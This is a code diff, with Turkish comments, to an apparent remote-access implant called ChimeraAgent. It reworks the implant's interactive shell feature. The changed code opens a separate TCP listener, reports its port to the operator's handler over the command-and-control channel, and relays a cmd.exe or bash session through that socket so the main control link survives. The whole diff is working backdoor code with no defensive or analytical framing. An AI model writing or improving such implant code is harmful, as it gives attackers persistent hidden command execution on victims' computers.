@@ -2316,16 +2316,48 @@ class ChimeraAgent:
     # Komut Çalıştırma
     # --------------------------------------------------------
     def shell_mode(self):
-        """Etkileşimli shell modunu başlatır (Raw Socket)."""
+        """Etkileşimli shell modunu başlatır (Ayrı TCP Tüneli).
+        
+        C2 soketini korumak için shell I/O ayrı bir TCP bağlantısı üzerinden
+        yapılır. Bu sayede shell kapatıldığında ana C2 bağlantısı kopmaz.
+        
+        Returns:
+            str: Sentinel değer — ana döngü bunu cevap olarak göndermez.
+        """
         # Shell komutunu belirle
         if sys.platform == "win32":
             shell_cmd = "cmd.exe"
         else:
             shell_cmd = "/bin/bash -i" if os.path.exists("/bin/bash") else "/bin/sh -i"
-            
+
+        # ── 1. Shell tüneli için ayrı TCP listener aç ──────────────
         try:
-            # PTY desteği olmadığı için pipe kullanıyoruz.
-            # stderr=subprocess.STDOUT ile hataları da aynı kanaldan alıyoruz.
+            tunnel_srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            tunnel_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            tunnel_srv.bind(("0.0.0.0", 0))           # OS rastgele port atar
+            tunnel_port = tunnel_srv.getsockname()[1]
+            tunnel_srv.listen(1)
+            tunnel_srv.settimeout(30)                  # 30 sn içinde handler bağlanmalı
+        except Exception as e:
+            return f"[!] Shell tüneli açılamadı: {e}"
+
+        # ── 2. Handler'a tünel portunu bildir (C2 üzerinden) ───────
+        self.send_data(f"SHELL_TUNNEL:{tunnel_port}")
+
+        # ── 3. Handler'ın tünel bağlantısını kabul et ──────────────
+        try:
+            shell_sock, _ = tunnel_srv.accept()
+        except socket.timeout:
+            tunnel_srv.close()
+            return "[!] Shell tüneli zaman aşımı: Handler bağlanamadı."
+        except Exception as e:
+            tunnel_srv.close()
+            return f"[!] Shell tüneli kabul hatası: {e}"
+        finally:
+            tunnel_srv.close()                        # Listener artık gereksiz
+
+        # ── 4. Subprocess başlat ───────────────────────────────────
+        try:
             process = subprocess.Popen(
                 shell_cmd,
                 shell=True,
@@ -2335,25 +2367,17 @@ class ChimeraAgent:
                 bufsize=0  # Unbuffered I/O
             )
         except Exception as e:
-            self.send_data(f"[!] Shell başlatılamadı: {e}")
-            return
+            shell_sock.close()
+            return f"[!] Shell başlatılamadı: {e}"
 
-        # Kullanıcıya shell'in başladığını bildir (HTTP üzerinden son mesaj)
-        self.send_data("[+] Shell oturumu başlatıldı. (Çıkmak için 'exit' yazın)")
-        
-        # Kısa bir bekleme, handler'ın moda geçmesi için
-        time.sleep(1)
-
-        # ----------------------------------------------------
-        # RAW SOCKET MODU (Direct Stream)
-        # ----------------------------------------------------
+        # ── 5. Raw I/O — shell_sock ↔ subprocess ──────────────────
         stop_event = threading.Event()
 
         def sock_to_proc():
-            """Socket -> Process STDIN"""
+            """Shell Socket -> Process STDIN"""
             while not stop_event.is_set():
                 try:
-                    data = self.sock.recv(1024)
+                    data = shell_sock.recv(4096)
                     if not data:
                         stop_event.set()
                         break
@@ -2370,38 +2394,37 @@ class ChimeraAgent:
                     break
 
         def proc_to_sock():
-            """Process STDOUT -> Socket"""
+            """Process STDOUT -> Shell Socket"""
             while not stop_event.is_set():
                 try:
-                    # Tek byte okuma (Non-blocking gibi davranması için)
                     byte = process.stdout.read(1)
                     if not byte:
                         stop_event.set()
                         break
-                    self.sock.send(byte)
+                    shell_sock.send(byte)
                 except Exception:
                     stop_event.set()
                     break
 
-        # Thread'leri başlat
         t1 = threading.Thread(target=sock_to_proc, daemon=True)
         t2 = threading.Thread(target=proc_to_sock, daemon=True)
-        
         t1.start()
         t2.start()
-        
+
         # Biri durana kadar bekle
         while not stop_event.is_set():
             time.sleep(0.1)
             if not t1.is_alive() or not t2.is_alive():
                 stop_event.set()
-        
-        # Temizlik
+
+        # ── 6. Temizlik — sadece shell soketini kapat ─────────────
         try: process.terminate()
         except: pass
-        
-        # Bağlantıyı kapat (Handler da kapatacak, reconnect ile temiz başlangıç yapılacak)
-        self.close_socket()
+        try: shell_sock.close()
+        except: pass
+
+        # C2 soketi (self.sock) DOKUNULMAZ — bağlantı kopmaz
+        return "__SHELL_COMPLETED__"
 
     def execute_command(self, cmd: str) -> str:
         """Sistem komutu çalıştırır.
@@ -2688,6 +2711,8 @@ class ChimeraAgent:
 
         # Özel komutlar - Shell
         if cmd_lower == "shell":
+            # shell_mode artık ayrı tünel kullanıyor, C2 soketine dokunmuyor.
+            # Tünel port bilgisini kendi gönderir, sentinel döner.
             return self.shell_mode()
         
         # Modül Yönetimi - Hafızadan modül yükleme ve çalıştırma
@@ -2940,6 +2965,10 @@ class ChimeraAgent:
                 
                 # Komutu çalıştır
                 output = self.execute_command(cmd)
+                
+                # Shell modu kendi iletişimini yönetir, sentinel dönerse gönderme
+                if output == "__SHELL_COMPLETED__":
+                    continue
                 
                 # Sonucu gönder
                 self.send_data(output)
